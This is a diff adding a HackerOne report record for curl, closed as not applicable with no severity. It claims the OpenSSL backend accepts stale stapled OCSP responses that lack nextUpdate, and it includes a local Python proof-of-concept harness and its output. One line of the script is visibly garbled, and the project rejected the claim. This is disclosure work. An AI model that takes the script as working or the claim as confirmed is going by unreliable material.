@@ -1,0 +1,111 @@
+{
+  "id": 4135826,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTM1ODI2",
+  "url": "https://hackerone.com/reports/4135826",
+  "title": "--cert-status with OpenSSL accepts a stapled OCSP response of any age when it lacks nextUpdate (revoked certificate keeps passing)",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "none",
+  "readable_substate": "N/A",
+  "created_at": "2026-10-21T23:43:51.577Z",
+  "submitted_at": "2026-10-21T23:43:51.910Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "1rhino2",
+    "url": "/1rhino2",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/h1d00k3qx0lgut84ryy9vextnubi/f4770e29726b679d8210b3bcebb50139392345e8ead50e7d67de79a93076e327"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-23T07:26:51.304Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-22T09:07:50.638Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\ncurl built with OpenSSL accepts a stapled OCSP \"good\" response of any age under CURLOPT_SSL_VERIFYSTATUS (--cert-status) when the response omits nextUpdate, so a response signed before a certificate was revoked keeps passing the check for as long as the certificate itself is valid. The GnuTLS backend of the same curl rejects that old response, the OpenSSL backend applies no age limit at all. Omitting nextUpdate is the default behavior of the openssl ocsp responder, so private CAs built on it produce exactly these responses, and anyone who captured a \"good\" response for a certificate before its revocation can replay it indefinitely with the revoked key. I reproduced this on Linux with curl built from the curl-8_23_0 tag and from master b5ca96a441 against OpenSSL 3.6.4 using the script below, which makes a CA and a leaf valid since 500 days and staples three responses signed now, a fresh \"good\" one, a fresh \"revoked\" one and a \"good\" one with thisUpdate 400 days in the past and no nextUpdate (producedAt is current, curl only looks at thisUpdate and nextUpdate), and the OpenSSL builds exit 0, 91 and 0 for them while the GnuTLS builds exit 0, 60 and 60. AI tooling helped me with the test script, the setup and the numbers are mine.\n\n```python\n\n#!/usr/bin/env python3\n# curl --cert-status with OpenSSL: a fresh \"revoked\" staple is rejected, an old \"good\" one for the same cert without nextUpdate is accepted\n# needs: python3 cryptography, openssl s_server on PATH; usage: python3 poc_ocsp_age.py /path/to/curl\nimport datetime, subprocess, sys, time\nfrom cryptography import x509\nfrom cryptography.x509 import ocsp\nfrom cryptography.x509.oid import NameOID\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nnow = datetime.datetime.now(datetime.timezone.utc); day = datetime.timedelta(days=1)\ndef cert(name, key, issuer, ikey, ca):\n    b = x509.CertificateBuilder().subject_name(name).issuer_name(issuer).public_key(key.public_key()).serial_number(x509.random_serial_number())\n    b = b.not_valid_before(now - 500 * day).not_valid_after(now + 30 * day).add_extension(x509.BasicConstraints(ca=ca, path_length=None), critical=True)\n    if not ca: b = b.add_extension(x509.SubjectAlternativeName([x509.DNSName('localhost')]), critical=False)\n    return b.sign(ikey, hashes.SHA256())\ncakey, leafkey = rsa.generate_private_key(65537, 2048), rsa.generate_private_key(65537, 2048)\ncan = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 'poc ca')]); ca = cert(can, cakey, can, cakey, True)\nleaf = cert(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 'localhost')]), leafkey, can, cakey, False)\npem = serialization.Encoding.PEM\nopen('ca.pem', 'wb').write(ca.public_bytes(pem)); open('leaf.pem', 'wb').write(leaf.public_bytes(pem))\nopen('leaf.key', 'wb').write(leafkey.private_bytes(pem, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))\ndef staple(name, status, this_update, next_update, rtime=None, reason=None):\n    b = ocsp.OCSPResponseBuilder().add_response(cert=leaf, issuer=ca, algorithm=hashes.SHA1(), cert_status=status, this_update=this_update,\n        next_update=next_update, revocation_time=rtime, revocation_reason=reason).responder_id(ocsp.OCSPResponderEncoding.NAME, ca)\n    open(name, 'wb').write(b.sign(cakey, hashes.SHA256()).public_bytes(serialization.Encoding.DER))\n    srv = subprocess.Popen(['openssl', 's_server', '-accept', '8443', '-cert', 'leaf.pem', '-key', 'leaf.key', '-cert_chain', 'ca.pem', '-status_file', name, '-www', '-quiet'])\n    time.sleep(1); r = subprocess.run([sys.argv[1], '-sS', '--cacert', 'ca.pem', '--cert-status', '-o', '/dev/null', 'https://localhost:8443/']); srv.terminate(); srv.wait(); return r.returncode\nprint('fresh good staple (thisUpdate 1 hour ago, nextUpdate tomorrow):    exit', staple('good.der', ocsp.OCSPCertStatus.GOOD, now - day / 24, now + day))\nprint('fresh revoked staple (thisUpdate 1 hour ago, ntaple('revoked.der', ocsp.OCSPCertStatus.REVOKED, now - day / 24, now + day, now - 30 * day, x509.ReasonFlags.key_compromise))\nprint('old good staple (thisUpdate 400 days ago, no nextUpdate):          exit', staple('old.der', ocsp.OCSPCertStatus.GOOD, now - 400 *\nday, None))```\n\n```\n$ python3 poc_ocsp_age.py ./curl-openssl\ncurl: (91) SSL certificate revocation reason: keyCompromise (1)\nfresh good staple (thisUpdate 1 hour ago, nextUpdate tomorrow):    exit 0\nfresh revoked staple (thisUpdate 1 hour ago, nextUpdate tomorrow): exit 91\nold good staple (thisUpdate 400 days ago, no nextUpdate):          exit 0\n$ python3 poc_ocsp_age.py ./curl-gnutls\nfresh good staple (thisUpdate 1 hour ago, nextUpdate tomorrow):    exit 0\nfresh revoked staple (thisUpdate 1 hour ago, nextUpdate tomorrow): exit 60\nold good staple (thisUpdate 400 days ago, no nextUpdate):          exit 60\n```\n\n## Affected version\n\n```\ncurl 8.23.0-DEV (x86_64-pc-linux-gnu) libcurl/8.23.0-DEV OpenSSL/3.6.4 zlib/1.3.2 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.23.3 nghttp2/1.70.0 OpenLDAP/2.6.14\n```\n\n## Steps To Reproduce:\n\n```\npython3 poc_ocsp_age.py /path/to/curl\n```\n\n## Impact\n\n## Summary:\n\nA client that requires OCSP stapling keeps trusting a certificate after its revocation when the other side holds the revoked key and a \"good\" response captured before the revocation from a responder that omits nextUpdate, which the stock openssl ocsp responder does, so revocation is never enforced for the lifetime of that certificate.",
+  "weakness": {
+    "id": 557,
+    "name": "Improper Check for Certificate Revocation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
